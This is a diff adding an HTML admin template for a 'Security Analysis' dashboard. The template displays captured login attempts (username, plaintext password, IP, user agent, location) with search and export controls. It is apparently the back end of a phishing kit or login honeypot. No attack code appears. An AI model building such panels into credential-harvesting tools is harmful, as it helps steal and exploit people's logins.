@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard - Security Analysis</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/admin.css') }}">
+</head>
+<body>
+    <div class="cyber-lines"></div>
+    
+    <div class="dashboard-container">
+        <div class="header">
+            <h1>Security Analysis Dashboard</h1>
+            <div class="stats-bar">
+                <div class="stat">
+                    <span class="stat-value" id="totalAttempts">0</span>
+                    <span class="stat-label">Total Attempts</span>
+                </div>
+                <div class="stat">
+                    <span class="stat-value" id="uniqueIPs">0</span>
+                    <span class="stat-label">Unique IPs</span>
+                </div>
+                <div class="stat">
+                    <span class="stat-value" id="todayAttempts">0</span>
+                    <span class="stat-label">Today's Attempts</span>
+                </div>
+            </div>
+            <div class="admin-controls">
+                <a href="{{ url_for('admin_logout') }}" class="logout-btn">Logout</a>
+            </div>
+        </div>
+
+        <div class="data-grid">
+            <div class="grid-header">
+                <h2>Captured Data Analysis</h2>
+                <div class="controls">
+                    <input type="text" id="searchInput" placeholder="Search..." class="search-input">
+                    <button class="export-btn">Export Data</button>
+                </div>
+            </div>
+
+            <div class="table-container">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Timestamp</th>
+                            <th>Username</th>
+                            <th>Password</th>
+                            <th>IP Address</th>
+                            <th>User Agent</th>
+                            <th>Location</th>
+                        </tr>
+                    </thead>
+                    <tbody id="dataTable">
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+       
+            
+
+    <script src="{{ url_for('static', filename='js/admin.js') }}"></script>
+</body>
+</html> 
